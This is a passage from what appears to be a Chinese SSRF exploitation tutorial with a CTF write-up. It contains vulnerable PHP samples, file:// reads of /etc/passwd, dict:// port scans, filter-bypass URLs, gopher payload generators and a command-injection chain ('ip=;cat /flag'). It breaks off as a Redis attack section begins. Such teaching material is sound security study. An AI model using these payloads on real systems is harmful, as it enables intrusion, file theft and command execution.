函数将整个文件或一个url所指向的文件读入一个字符串中，并展示给用户，我们构造类似`ssrf.php?url=../../../../../etc/passwd`的paylaod即可读取服务器本地的任意文件。\n\n![image-20210112225820457](https://image.3001.net/images/20210114/1610597996_5fffc66c9d8087b2c3242.png!small)\n\nreadfile()函数与file\\_get\\_contents()函数相似。\n\n### fsockopen()\n\n`fsockopen($hostname,$port,$errno,$errstr,$timeout)`用于打开一个网络连接或者一个Unix 套接字连接，初始化一个套接字连接到指定主机（hostname），实现对用户指定url数据的获取。该函数会使用socket跟服务器建立tcp连接，进行传输原始数据。 fsockopen()将返回一个文件句柄，之后可以被其他文件类函数调用（例如：fgets()，fgetss()，fwrite()，fclose()还有feof()）。如果调用失败，将返回false。\n\n测试代码：\n\n```\n// ssrf.php\n<?php\n$host=$\\_GET\\['url'\\];\n$fp = fsockopen($host, 80, $errno, $errstr, 30);\nif (!$fp) {\n    echo \"$errstr ($errno)<br />\\\\n\";\n} else {\n    $out = \"GET / HTTP/1.1\\\\r\\\\n\";\n    $out .= \"Host: $host\\\\r\\\\n\";\n    $out .= \"Connection: Close\\\\r\\\\n\\\\r\\\\n\";\n    fwrite($fp, $out);\n    while (!feof($fp)) {\n        echo fgets($fp, 128);\n    }\n    fclose($fp);\n}\n?>\n```\n\n构造`ssrf.php?url=www.baidu.com`即可成功触发ssrf并返回百度主页：\n\n![image-20210112230552313](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252201642.jpeg)\n\n### curl\\_exec()\n\ncurl\\_init(url)函数初始化一个新的会话，返回一个cURL句柄，供curl\\_setopt()，curl\\_exec()和curl\\_close() 函数使用。\n\n测试代码：\n\n```\n// ssrf.php\n<?php \nif (isset($\\_GET\\['url'\\])){\n\t$link = $\\_GET\\['url'\\];\n\t$curlobj = curl\\_init(); // 创建新的 cURL 资源\n\tcurl\\_setopt($curlobj, CURLOPT\\_POST, 0);\n\tcurl\\_setopt($curlobj,CURLOPT\\_URL,$link);\n\tcurl\\_setopt($curlobj, CURLOPT\\_RETURNTRANSFER, 1); // 设置 URL 和相应的选项\n\t$result=curl\\_exec($curlobj); // 抓取 URL 并把它传递给浏览器\n\tcurl\\_close($curlobj); // 关闭 cURL 资源，并且释放系统资源\n```\n\n\n\n\t// $filename = './curled/'.rand().'.txt';\n\t// file\\_put\\_contents($filename, $result); \n\techo $result;\n}\n?>\n\n构造`ssrf.php?url=www.baidu.com`即可成功触发ssrf并返回百度主页：\n\n![image-20210112231108247](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252201758.jpeg)\n\n### SoapClient\n\nSOAP是简单对象访问协议，简单对象访问协议（SOAP）是一种轻量的、简单的、基于 XML 的协议，它被设计成在 WEB 上交换结构化的和固化的信息。PHP 的 SoapClient 就是可以基于SOAP协议可专门用来访问 WEB 服务的 PHP 客户端。\n\nSoapClient是一个php的内置类，当其进行反序列化时，如果触发了该类中的`__call`方法，那么`__call`便方法可以发送HTTP和HTTPS请求。该类的构造函数如下：\n\npublic SoapClient :: SoapClient(mixed $wsdl \\[，array $options \\])\n\n+   第一个参数是用来指明是否是wsdl模式。\n    \n+   第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而 uri 是SOAP服务的目标命名空间。\n    \n\n知道上述两个参数的含义后，就很容易构造出SSRF的利用Payload了。我们可以设置第一个参数为null，然后第二个参数为一个包含location和uri的数组，location选项的值设置为target\\_url：\n\n```\n// ssrf.php  \n<?php  \n$a = new SoapClient(null,array('uri'=>'http://47.xxx.xxx.72:2333', 'location'=>'http://47.xxx.xxx.72:2333/aaa'));  \n$b = serialize($a);  \necho $b;  \n$c = unserialize($b);  \n$c->a();    // 随便调用对象中不存在的方法, 触发\\_\\_call方法进行ssrf  \n?>\n```\n\n47.xxx.xxx.72监听2333端口，访问ssrf.php，即可在47.xxx.xxx.72上得到访问的数据：\n\n![image-20210112234821125](https://image.3001.net/images/20210114/1610597999_5fffc66f758c21c129c42.png!small)\n\n如上图所示，ssrf触发成功。\n\n由于它仅限于http/https协议，所以用处不是很大。但是如果这里的http头部还存在crlf漏洞，那么我们就可以进行ssrf+crlf，注入或修改一些http请求头，详情请看：[《SoapClient+crlf组合拳进行SSRF》](https://www.anquanke.com/post/id/202025)\n\n### SSRF漏洞利用的相关协议\n\nSSRF漏洞的利用所涉及的协议有：\n\n+   file协议： 在有回显的情况下，利用 file 协议可以读取任意文件的内容\n    \n+   dict协议：泄露安装软件版本信息，查看端口，操作内网redis服务等\n    \n+   gopher协议：gopher支持发出GET、POST请求。可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell\n    \n+   http/s协议：探测内网主机存活\n    \n\n下面我们对这些协议的利用进行逐一演示。\n\n## 常见利用方式（file、http/s和dict协议）\n\nSSRF的利用主要就是读取内网文件、探测内网主机存活、扫描内网端口、攻击内网其他应用等，而这些利用的手法无一不与这些协议息息相关。\n\n以下几个演示所用的测试代码：\n\n```\n// ssrf.php\n<?php \nif (isset($\\_GET\\['url'\\])){\n\t$link = $\\_GET\\['url'\\];\n\t$curlobj = curl\\_init(); // 创建新的 cURL 资源\n\tcurl\\_setopt($curlobj, CURLOPT\\_POST, 0);\n\tcurl\\_setopt($curlobj,CURLOPT\\_URL,$link);\n\tcurl\\_setopt($curlobj, CURLOPT\\_RETURNTRANSFER, 1); // 设置 URL 和相应的选项\n\t$result=curl\\_exec($curlobj); // 抓取 URL 并把它传递给浏览器\n\tcurl\\_close($curlobj); // 关闭 cURL 资源，并且释放系统资源\n```\n\n\n\n\t// $filename = './curled/'.rand().'.txt';\n\t// file\\_put\\_contents($filename, $result); \n\techo $result;\n}\n?>\n\n### 读取内网文件（file协议）\n\n我们构造如下payload，即可将服务器上的本地文件及网站源码读取出来：\n\nssrf.php?url=file:///etc/passwd  \nssrf.php?url=file:///var/www/html/flag.php\n\n![image-20210113000529370](https://image.3001.net/images/20210114/1610598000_5fffc670560e2d6fed29c.png!small)\n\n![image-20210113000640979](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252201861.jpeg)\n\n### 探测内网主机存活（http/s协议）\n\n一般是先想办法得到目标主机的网络配置信息，如读取/etc/hosts、/proc/net/arp、/proc/net/fib\\_trie等文件，从而获得目标主机的内网网段并进行爆破。\n\n域网IP地址范围分三类，以下IP段为内网IP段：\n\n+   C类：192.168.0.0 - 192.168.255.255\n    \n+   B类：172.16.0.0 - 172.31.255.255\n    \n+   A类：10.0.0.0 - 10.255.255.255\n    \n\n测试环境如下：\n\n![image-20210113190506825](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252201380.jpeg)\n\n假设WEB服务器Ubuntu上面存在上述所说的SSRF漏洞，我们构造如下payload，便可通过Ubuntu服务器发送请求去探测内网存活的主机：\n\nssrf.php?url=http://192.168.52.1  \nssrf.php?url=http://192.168.52.6  \nssrf.php?url=http://192.168.52.25  \n......\n\n为了方便，我们可以借助burpsuite的Intruder模块进行爆破，如下所示：\n\n![image-20210113120505690](https://image.3001.net/images/20210114/1610598003_5fffc67301c9d222a58c6.png!small)\n\n![image-20210113120551977](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252201508.jpeg)\n\n将爆破的线程尽可能设的小一些。开始爆破后即可探测到目标内网中存在如下两个存活的主机（192.168.52.130和192.168.52.131）：\n\n![image-20210113120806794](https://image.3001.net/images/20210114/1610598005_5fffc6750b23dd040c364.png!small)\n\n### 扫描内网端口（http/s和dict协议）\n\n同样是上面那个测试环境：\n\n![image-20210113190455756](https://image.3001.net/images/20210114/1610598006_5fffc67625206702cdd18.png!small)\n\n我们利用dict协议构造如下payload即可查看内网主机上开放的端口及端口上运行服务的版本信息等：\n\nssrf.php?url=dict://192.168.52.131:6379/info   // redis  \nssrf.php?url=dict://192.168.52.131:80/info     // http  \nssrf.php?url=dict://192.168.52.130:22/info   // ssh\n\n![image-20210113190244954](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252201787.jpeg)\n\n![image-20210113122530377](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252201476.jpeg)\n\n同样可以借助burpsuite来爆破内网主机上的服务。\n\n## 相关绕过姿势\n\n对于SSRF的限制大致有如下几种：\n\n+   限制请求的端口只能为Web端口，只允许访问HTTP和HTTPS的请求。\n    \n+   限制域名只能为[http://www.xxx.com](http://www.xxx.com/)\n    \n+   限制不能访问内网的IP，以防止对内网进行攻击。\n    \n+   屏蔽返回的详细信息。\n    \n\n### 利用HTTP基本身份认证的方式绕过\n\n如果目标代码限制访问的域名只能为 [http://www.xxx.com](http://www.xxx.com/)，那么我们可以采用HTTP基本身份认证的方式绕过。即@：[http://www.xxx.com@www.evil.com](http://www.evil.com/)\n\n### 利用302跳转绕过内网IP\n\n绕过对内网ip的限制我们可以**利用302跳转**的方法，有以下两种。\n\n（1）网络上存在一个很神奇的服务，网址为 [http://xip.io](http://xip.io/)，当访问这个服务的任意子域名的时候，都会重定向到这个子域名，举个例子：\n\n当我们访问：[http://127.0.0.1.xip.io/flag.php](http://127.0.0.1.xip.io/flag.php)时，实际访问的是[http://127.0.0.1/1.php](http://127.0.0.1/1.php)。像这种网址还有[http://nip.io](http://nip.io/)，[http://sslip.io](http://sslip.io/)。\n\n如下示例（flag.php仅能从本地访问）：\n\n![image-20210113124813254](https://image.3001.net/images/20210114/1610598008_5fffc67858617e4b20974.png!small)\n\n（2）短地址跳转绕过，这里也给出一个网址 [https://4m.cn/](https://4m.cn/)：\n\n![image-20201027163528110](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252201164.jpeg)\n\n直接使用生成的短连接 [https://4m.cn/FjOdQ](https://4m.cn/FjOdQ)就会自动302跳转到 [http://127.0.0.1/flag.php](http://127.0.0.1/flag.php)上，这样就可以绕过WAF了：\n\n![image-20210113124727560](https://image.3001.net/images/20210114/1610598010_5fffc67a644209d507f01.png!small)\n\n### 进制的转换绕过内网IP\n\n可以使用一些不同的进制替代ip地址，从而绕过WAF，这里给出个从网上扒的php脚本可以一键转换：\n\n```\n<?php  \n$ip = '127.0.0.1';  \n$ip = explode('.',$ip);  \n$r = ($ip\\[0\\] << 24) | ($ip\\[1\\] << 16) | ($ip\\[2\\] << 8) | $ip\\[3\\] ;  \nif($r < 0) {  \n$r += 4294967296;  \n}  \necho \"十进制:\";     // 2130706433  \necho $r;  \necho \"八进制:\";     // 0177.0.0.1  \necho decoct($r);  \necho \"十六进制:\";   // 0x7f.0.0.1  \necho dechex($r);  \n?>\n```\n\n\n\n### 其他各种指向127.0.0.1的地址\n\nhttp://localhost/         # localhost就是代指127.0.0.1  \nhttp://0/                 # 0在window下代表0.0.0.0，而在liunx下代表127.0.0.1  \nhttp://\\[0:0:0:0:0:ffff:127.0.0.1\\]/    # 在liunx下可用，window测试了下不行  \nhttp://\\[::\\]:80/           # 在liunx下可用，window测试了下不行  \nhttp://127。0。0。1/       # 用中文句号绕过  \nhttp://①②⑦.⓪.⓪.①  \nhttp://127.1/  \nhttp://127.00000.00000.001/ # 0的数量多一点少一点都没影响，最后还是会指向127.0.0.1\n\n### 利用不存在的协议头绕过指定的协议头\n\n`file_get_contents()`函数的一个特性，即当PHP的`file_get_contents()`函数在遇到不认识的协议头时候会将这个协议头当做文件夹，造成目录穿越漏洞，这时候只需不断往上跳转目录即可读到根目录的文件。（include()函数也有类似的特性）\n\n测试代码：\n\n```\n// ssrf.php  \n<?php  \nhighlight\\_file(\\_\\_FILE\\_\\_);  \nif(!preg\\_match('/^https/is',$\\_GET\\['url'\\])){  \ndie(\"no hack\");  \n}  \necho file\\_get\\_contents($\\_GET\\['url'\\]);  \n?>\n```\n\n上面的代码限制了url只能是以https开头的路径，那么我们就可以如下：\n\nhttpsssss://\n\n此时`file_get_contents()`函数遇到了不认识的伪协议头“httpsssss://”，就会将他当做文件夹，然后再配合目录穿越即可读取文件：\n\nssrf.php?url=httpsssss://../../../../../../etc/passwd\n\n![image-20210113130534208](https://image.3001.net/images/20210114/1610598011_5fffc67b28e67ca0b6d7f.png!small)\n\n这个方法可以在SSRF的众多协议被禁止且只能使用它规定的某些协议的情况下来进行读取文件。\n\n### 利用URL的解析问题\n\n该思路来自Orange Tsai成员在2017 BlackHat 美国黑客大会上做的题为[《A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages》](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf)的分享。主要是利用readfile和parse\\_url函数的解析差异以及curl和parse\\_url解析差异来进行绕过。\n\n**（1）利用readfile和parse\\_url函数的解析差异绕过指定的端口**\n\n测试代码：\n\n```\n// ssrf.php\n<?php\n$url = 'http://'. $\\_GET\\[url\\];\n$parsed = parse\\_url($url);\nif( $parsed\\[port\\] == 80 ){  // 这里限制了我们传过去的url只能是80端口的\n\treadfile($url);\n} else {\n\tdie('Hacker!');\n}\n```\n\n用python在当前目录下起一个端口为11211的WEB服务：\n\n![image-20210113133210683](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252201658.jpeg)\n\n上述代码限制了我们传过去的url只能是80端口的，但如果我们想去读取11211端口的文件的话，我们可以用以下方法绕过：\n\nssrf.php?url=127.0.0.1:11211:80/flag.txt\n\n![image-20210113133242461](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202332.jpeg)\n\n如上图所示成功读取了11211端口中的flag.txt文件，下面用BlackHat的图来说明原理：\n\n![1610601312_5fffd36035478c41c2c18.png!small?1610601312696](https://image.3001.net/images/20210114/1610601312_5fffd36035478c41c2c18.png!small?1610601312696)\n\n从上图中可以看出readfile()函数获取的端口是最后冒号前面的一部分（11211），而parse\\_url()函数获取的则是最后冒号后面的的端口（80），利用这种差异的不同，从而绕过WAF。\n\n这两个函数在解析host的时候也有差异，如下图：\n\n![1610601347_5fffd383dfc1a3982425f.png!small?1610601348433](https://image.3001.net/images/20210114/1610601347_5fffd383dfc1a3982425f.png!small?1610601348433)\n\nreadfile()函数获取的是@号后面一部分（evil.com），而parse\\_url()函数获取的则是@号前面的一部分（google.com），利用这种差异的不同，我们可以绕过题目中parse\\_url()函数对指定host的限制。\n\n**（2）利用curl和parse\\_url的解析差异绕指定的host**\n\n原理如下：\n\n![1610601386_5fffd3aa565a51587d90c.png!small?1610601386867](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202234.jpeg)\n\n从上图中可以看到curl()函数解析的是第一个@后面的网址，而parse\\_url()函数解析的是第二个@后面的网址。利用这个原理我们可以绕过题目中parse\\_url()函数对指定host的限制。\n\n测试代码：\n\n```\n<?php\nhighlight\\_file(\\_\\_FILE\\_\\_);\nfunction check\\_inner\\_ip($url)\n{\n    $match\\_result=preg\\_match('/^(http|https)?:\\\\/\\\\/.\\*(\\\\/)?.\\*$/',$url);\n    if (!$match\\_result)\n    {\n        die('url fomat error');\n    }\n    try\n    {\n        $url\\_parse=parse\\_url($url);\n    }\n    catch(Exception $e)\n    {\n        die('url fomat error');\n        return false;\n    }\n    $hostname=$url\\_parse\\['host'\\];\n    $ip=gethostbyname($hostname);\n    $int\\_ip=ip2long($ip);\n    return ip2long('127.0.0.0')>>24 == $int\\_ip>>24 || ip2long('10.0.0.0')>>24 == $int\\_ip>>24 || ip2long('172.16.0.0')>>20 == $int\\_ip>>20 || ip2long('192.168.0.0')>>16 == $int\\_ip>>16;// 检查是否是内网ip\n}\nfunction safe\\_request\\_url($url)\n{\n    if (check\\_inner\\_ip($url))\n    {\n        echo $url.' is inner ip';\n    }\n    else\n    {\n        $ch = curl\\_init();\n        curl\\_setopt($ch, CURLOPT\\_URL, $url);\n        curl\\_setopt($ch, CURLOPT\\_RETURNTRANSFER, 1);\n        curl\\_setopt($ch, CURLOPT\\_HEADER, 0);\n        $output = curl\\_exec($ch);\n        $result\\_info = curl\\_getinfo($ch);\n        if ($result\\_info\\['redirect\\_url'\\])\n        {\n            safe\\_request\\_url($result\\_info\\['redirect\\_url'\\]);\n        }\n        curl\\_close($ch);\n        var\\_dump($output);\n    }\n}\n$url = $\\_GET\\['url'\\];\nif(!empty($url)){\n    safe\\_request\\_url($url);\n}\n?>\n```\n\n上述代码中可以看到`check_inner_ip`函数通过`url_parse()`函数检测是否为内网IP，如果不是内网 IP ，则通过`curl()`请求 url 并返回结果，我们可以利用curl和parse\\_url解析的差异不同来绕过这里的限制，让`parse_url()`处理外部网站网址，最后`curl()`请求内网网址。paylaod如下：\n\nssrf.php?url=http://@127.0.0.1:80@www.baidu.com/flag.php\n\n![image-20210113134443846](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202304.jpeg)\n\n的 [\\[2020 首届“祥云杯”网络安全大赛\\]doyouknowssrf](https://whoamianony.top/2020/11/24/ctf-bi-sai-ji-lu/2020-shou-jie-xiang-yun-bei-wang-luo-an-quan-da-sai-writeup/#toc-heading-5)这道题利用的就是这个思路。\n\n## 常见攻击方式（Gopher协议）\n\n### Gopher协议在SSRF中的利用\n\nGopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用TCP 70端口。但在WWW出现后，Gopher失去了昔日的辉煌。\n\n现在的Gopher协议已经很少有人再使用它了，但是该协议在SSRF中却可以发挥巨大的作用，可以说是SSRF中的万金油。由于Gopher协议支持发出GET、POST请求，我们可以先截获GET请求包和POST请求包，再构造成符合Gopher协议请求的payload进行SSRF利用，甚至可以用它来攻击内网中的Redis、MySql、FastCGI等应用，这无疑大大扩展了我们的SSRF攻击面。\n\n**（1）Gopher协议格式**\n\nURL: gopher://<host>:<port>/<gopher-path>\\_后接TCP数据流  \n\n\\# 注意不要忘记后面那个下划线\"\\_\"，下划线\"\\_\"后面才开始接TCP数据流，如果不加这个\"\\_\"，那么服务端收到的消息将不是完整的，该字符可随意写。\n\n+   gopher的默认端口是70\n    \n+   如果发起POST请求，回车换行需要使用`%0d%0a`来代替`%0a`，如果多个参数，参数之间的&也需要进行URL编码\n    \n\n> 那么如何利用Gopher发送HTTP的请求呢？例如GET请求。我们直接发送一个原始的HTTP包不就行了吗。在gopher协议中发送HTTP的数据，需要以下三步：\n>\n> 1.  抓取或构造HTTP数据包\n>\n> 2.  URL编码、将回车换行符`%0a`替换为`%0d%0a`\n>\n> 3.  发送符合gopher协议格式的请求\n>\n\n**（2）利用Gopher协议发送HTTP GET请求**\n\n测试代码：\n\n```\n// echo.php  \n<?php  \necho \"Hello \".$\\_GET\\[\"whoami\"\\].\"\\\\n\"  \n?>\n```\n\n接下来我们构造payload。一个典型的GET型的HTTP包类似如下：\n\n```\nGET /echo.php?whoami=Bunny HTTP/1.1  \nHost: 47.xxx.xxx.72\n```\n\n然后利用以下脚本进行一步生成符合Gopher协议格式的payload：\n\n```\nimport urllib.parse  \npayload =\\\\  \n\"\"\"GET /echo.php?whoami=Bunny HTTP/1.1  \nHost: 47.xxx.xxx.72  \n\"\"\"    \n```\n\n\\# 注意后面一定要有回车，回车结尾表示http请求结束  \n\n```\ntmp = urllib.parse.quote(payload)  \nnew = tmp.replace('%0A','%0D%0A')  \nresult = 'gopher://47.xxx.xxx.72:80/'+'\\_'+new  \nprint(result)\n```\n\n![image-20210113170748727](https://image.3001.net/images/20210114/1610598015_5fffc67f7078252c1e5a9.png!small)\n\n> **注意这几个问题：**\n>\n> 1.  问号（?）需要转码为URL编码，也就是%3f\n>\n> 2.  回车换行要变为%0d%0a,但如果直接用工具转，可能只会有%0a\n>\n> 3.  在HTTP包的最后要加%0d%0a，代表消息结束（具体可研究HTTP包结束）\n>\n\n然后执行：\n\n```\ncurl gopher://47.xxx.xxx.72:80/\\_GET%20/echo.php%3Fwhoami%3DBunny%20HTTP/1.1%0D%0AHost%3A%2047.xxx.xxx.72%0D%0A\n```\n\n![image-20210113171043970](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202964.jpeg)\n\n如上图，成功用GET方法传参并输出“Hello Bunny”。\n\n**（3）利用Gopher协议发送HTTP POST请求**\n\n测试代码：\n\n```\n// echo.php  \n<?php  \necho \"Hello \".$\\_POST\\[\"whoami\"\\].\"\\\\n\"  \n?>\n```\n\n接下来我们构造payload。一个典型的POST型的HTTP包类似如下：\n\n```\nPOST /echo.php HTTP/1.1\nHost: 47.xxx.xxx.72\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 12\n\nwhoami=Bunny\n```\n\n**注意：上面那四个HTTP头是POST请求必须的，即POST、Host、Content-Type和Content-Length。如果少了会报错的，而GET则不用。并且，特别要注意Content-Length应为字符串“whoami=Bunny”的长度。**\n\n最后用脚本我们将上面的POST数据包进行URL编码并改为gopher协议\n\n```\nimport urllib.parse\npayload =\\\\\n\"\"\"POST /echo.php HTTP/1.1\nHost: 47.xxx.xxx.72\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 12\n\nwhoami=Bunny\n\"\"\"  \n```\n\n\n# 注意后面一定要有回车，回车结尾表示http请求结束\n```\ntmp = urllib.parse.quote(payload)\nnew = tmp.replace('%0A','%0D%0A')\nresult = 'gopher://47.xxx.xxx.72:80/'+'\\_'+new\nprint(result)\n```\n\n![image-20210113171513366](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202109.jpeg)\n\n然后执行：\n\n```\ncurl gopher://47.xxx.xxx.72:80/\\_POST%20/echo.php%20HTTP/1.1%0D%0AHost%3A%2047.xxx.xxx.72%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%2012%0D%0A%0D%0Awhoami%3DBunny%0D%0A\n```\n\n![image-20210113171641047](https://image.3001.net/images/20210114/1610598018_5fffc682e955f917dcc6e.png!small)\n\n如上图，成功用POST方法传参并输出“Hello Bunny”。\n\n**\\[2020 科来杯初赛\\]Web1**这道题就是典型的运用Gopher发送HTTP POST请求进行SSRF攻击的思路。\n\n### \\[2020 科来杯初赛\\]Web1\n\n进入题目后即给处源码：\n\n![image-20200921134331679](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202960.jpeg)\n\n这里很明显就是一个SSRF，url过滤了`file`、`ftp`，但是必须要包含`127.0.0.1`。并且，我们还发现一个tool.php页面，但是该页面进去之后仅显示一个“Not localhost”，我们可以用这个ssrf将tool.php的源码读住来，构造反序列化payload：\n\n```\n<?php  \nclass Welcome {  \nprotected $url = \"http://127.0.0.1/tool.php\";\n\n}  \n$poc = new Welcome;  \n//echo serialize($poc);  \necho urlencode(serialize($poc));  \n?>\n```\n\n生成：\n\n```\nO%3A7%3A%22Welcome%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00url%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Ftool.php%22%3B%7D\n\n// O:7:\"Welcome\":1:{s:6:\"\\*url\";s:25:\"http://127.0.0.1/tool.php\";}\n```\n\n将Welcome后面表示对象属性个数的“1”改为“2”即可绕过`__destruct()`的限制。\n\n![image-20200921134812338](https://image.3001.net/images/20210114/1610598020_5fffc684e27d96d0c30be.png!small)\n\n读出来tool.php的源码为：\n\n```\n#tool.php\n<?php\nerror\\_reporting(0);\n$respect\\_show\\_ping = function($params) {\n   extract($params);\n   $ip = isset($ip) ? $ip :'127.0.0.1';\n   system('ping -c 1 '.$ip);\n};\nif ($\\_SERVER\\[\"REMOTE\\_ADDR\"\\] !== \"127.0.0.1\"){\n   echo '<h2>Not localhost!</h2>';\n}\nelse {\n   highlight\\_file(\\_\\_FILE\\_\\_);\n   $respect\\_show\\_ping($\\_POST);\n}\n?>\n```\n\n可知tool.php页面存在命令执行漏洞。当REMOTE\\_ADDR为127.0.0.1时才可执行命令。REMOTE\\_ADDR头获取的是客户端的真实的IP，但是这个客户端是相对服务器而言的，也就是实际上与服务器相连的机器的IP（建立tcp连接的那个），这个值是不可以伪造的，如果没有代理的话，这个值就是用户实际的IP值，有代理的话，用户的请求会经过代理再到服务器，这个时候REMOTE\\_ADDR会被设置为代理机器的IP值。而X-Forwarded-For的值是可以篡改的。\n\n既然这里要求当REMOTE\\_ADDR为127.0.0.1时才可执行命令，且REMOTE\\_ADDR的值是不可以伪造的，我们要想让REMOTE\\_ADDR的值为127.0.0.1，不可能通过修改X-Forwarded-For的值来实现，我们要利用SSRF。\n\n我们可以利用index.php页面的SSRF利用gopher协议发POST包请求tool.php，进行命令执行。这样，整个攻击过程是在服务端进行的REMOTE\\_ADDR的值也就是127.0.0.1了。\n\nSSRF，利用gopher发POST包，进行命令执行\n\n```\nimport urllib.parse\ntest =\\\\\n\"\"\"POST /tool.php HTTP/1.1\nHost: 127.0.0.1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 13\n\nip=;cat /flag\n\"\"\"  \n```\n\n#注意后面一定要有回车，回车结尾表示http请求结束\n\n```\ntmp = urllib.parse.quote(test)\nnew = tmp.replace('%0A','%0D%0A')\nresult = 'gopher://127.0.0.1:80/'+'\\_'+new\nprint(result)\n```\n\n这里因为我们是把payload发送到服务端让服务端执行，所以我们的Host和gopher里的Host为127.0.0.1。\n\n生成gopher协议格式的payload为：\n\n```\ngopher://127.0.0.1:80/\\_POST%20/tool.php%20HTTP/1.1%0D%0AHost%3A%20127.0.0.1%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%2013%0D%0A%0D%0Aip%3D%3Bcat%20/flag%0D%0A\n```\n\n然后构造反序列化exp：\n\n```\n<?php\nclass Welcome {\n    protected $url = \"gopher://127.0.0.1:80/\\_POST%20/tool.php%20HTTP/1.1%0D%0AHost%3A%20127.0.0.1%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%2013%0D%0A%0D%0Aip%3D%3Bcat%20/flag%0D%0A\";\n    \n}\n$poc = new Welcome;\n//echo serialize($poc);\necho urlencode(serialize($poc));\n?>\n```\n\n生成payload：\n\n```\nO%3A7%3A%22Welcome%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00url%22%3Bs%3A197%3A%22gopher%3A%2F%2F127.0.0.1%3A80%2F\\_POST%2520%2Ftool.php%2520HTTP%2F1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application%2Fx-www-form-urlencoded%250D%250AContent-Length%253A%252013%250D%250A%250D%250Aip%253D%253Bcat%2520%2Fflag%250D%250A%22%3B%7D\n\n\n```\n\n同样将Welcome后面表示对象属性个数的“1”改为“2”绕过`__destruct()`的限制后执行：\n\n![image-20200921135622488](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202364.jpeg)\n\n如上图，命令执行成功。\n\n**注意：**这里要注意的是，我们发送的是POST包，而如果发送的是GET包的话，当这个URL经过服务器时，payload部分会被自动url解码，%20等字符又会被转码为空格。所以，curl\\_exec在发起gopher时用的就是没有进行URL编码的值，就导致了现在的情况，所以我们要对payload进行二次URL编码。编码结果类似如下：\n\n```\ngopher%3a%2f%2f127.0.0.1%3a80%2f\\_POST%2520%2ftool.php%2520HTTP%2f1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application%2fx-www-form-urlencoded%250D%250AContent-Length%253A%252013%250D%250A%250D%250Aip%253D%253Bcat%2520%2fflag%250D%250A\n```\n\n\n\n## 攻击内网Redis\n\n![20210113151633.png](https://image.3001.net/images/20210114/1610598023_5fffc6877d72429d2cbae.png!small)\n\nRedis是数据库的意思。Redis（Remote Dictionary Server )，即远程字典服务，是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。\n\n> **什么是Redis未授权访问？**\n>\n> Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空），会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的 config 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 /root/.ssh 文件夹的 authotrized\\_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器。\n>\n> 简单说，漏洞的产生条件有以下两点：\n>\n> +   redis 绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网。\n>\n> +   没有设置密码认证（一般为空），可以免密码远程登录redis服务。\n>\n\n在SSRF漏洞中，如果通过端口扫描等方法发现目标主机上开放6379端口，则目标主机上很有可能存在Redis服务。此时，如果目标主机上的Redis由于没有设置密码认证、没有进行添加防火墙等原因存在未授权访问漏洞的话，那我们就可以利用Gopher协议远程操纵目标主机上的Redis，可以利用 Redis 自身的提供的 config 命令像目标主机写WebShell、写SSH公钥、创建计划任务反弹Shell等，其思路都是一样的，就是先将Redis的本地数据库存放目录设置为web目录、~/.ssh目录或/var/spool/cron目录等，然后将dbfilename（本地数据库文件名）设置为文件名你想要写入的文件名称，最后再执行save或bgsave保存，则我们就指定的目录里写入指定的文件了。\n\n下面我们对攻击Redis的手法进行演示。测试环境如下，内网中其他主机均有外网IP并可以上网：\n\n![image-20210113190430425](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202356.jpeg)\n\n在上文扫描内网端口的实验中，我们发现了内网中有一个IP为192.168.52.131的主机在6379端口上运行着一个Redis服务，下面我们就用它来演示，通过Ubuntu服务器上的SSRF漏洞去攻击内网主机（192.168.52.131）的Redis。\n\n### 